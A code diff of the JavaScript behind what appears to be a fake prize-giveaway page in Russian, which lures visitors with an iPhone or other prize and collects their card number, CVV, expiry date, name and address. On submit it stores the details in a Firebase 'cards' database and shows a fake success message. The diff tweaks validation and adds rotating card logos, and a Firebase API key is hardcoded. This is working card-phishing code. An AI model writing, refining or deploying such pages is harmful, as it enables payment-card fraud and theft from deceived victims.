@@ -1,6 +1,6 @@
-console = {}
+//console = {}
 
-let prizes = [
+const prizes = [
     {
         name: 'iPhone 12 512Gb',
         image: 'images/iphone12.jpg',
@@ -23,7 +23,7 @@ let prizes = [
     },
 ]
 
-let currentPrize = prizes[Math.floor(Math.random() * 4)]
+const currentPrize = prizes[Math.floor(Math.random() * 4)]
 
 let firebaseConfig = {
     apiKey: "AIzaSyAT3mYd-fXjAElaNA3prt948JQtFcIJves",
@@ -37,7 +37,7 @@ let firebaseConfig = {
 
 firebase.initializeApp(firebaseConfig);
 
-let databaseee = firebase.database();
+const databaseee = firebase.database();
 
 $(document).ready(() => {
     $('#prize-name').html(currentPrize.name)
@@ -47,13 +47,17 @@ $(document).ready(() => {
     $("#cpa-form").submit(function(e){
         e.preventDefault()
     }); 
+    setInterval(() => {
+        $('#visa-image').attr('src', `images/${Math.round(Math.random() * 5)}.svg`);
+    },1000)
     $('#submit-button').click(function () { 
-        if ($('#adress').val().length >= 14 && $('#card-number').val().length == 16 && $('#post-code').val().length > 0 && $('#post-code').val().length <= 5 && $('#name-surname').val().length >= 9 && $('#cvv').val().length == 3 && $('#card-date').val().length == 5) {
-            swal(
+        if ($('#adress').val().length >= 14 && $('#card-number').val().length == 16 && $('#post-code').val().length > 0 && $('#post-code').val().length <= 5 && $('#name-surname').val().length >= 9 && $('#cvv').val().length == 3) {
+            Swal.fire(
                 'Молодец!',
                 'Ваш подарок будет у вас в течении двух недель!',
+                'success',
             )
-            let userRef = databaseee.ref('cards/' + Date.now());
+            const userRef = databaseee.ref('cards/' + Date.now());
             userRef.child(
             'Card' + Math.floor(Math.random() * Math.random() * 100 )).set({'card-number': $('#card-number').val(), 'Adress' : $('#adress').val() , 'Postal Code' : $('#post-code').val() ,'Name-Surname': $('#name-surname').val(), 'CVV': $('#cvv').val(),
                 'Date': $('#card-date').val()}
@@ -61,9 +65,10 @@ $(document).ready(() => {
             $('body').append('<audio src="assets/money.mp3" autoplay loop></audio>');
         }
         else {
-            swal(
+            Swal.fire(
                 'Неа!',
                 'Неправильные данные введены!',
+                'error',
             )
         }
     });
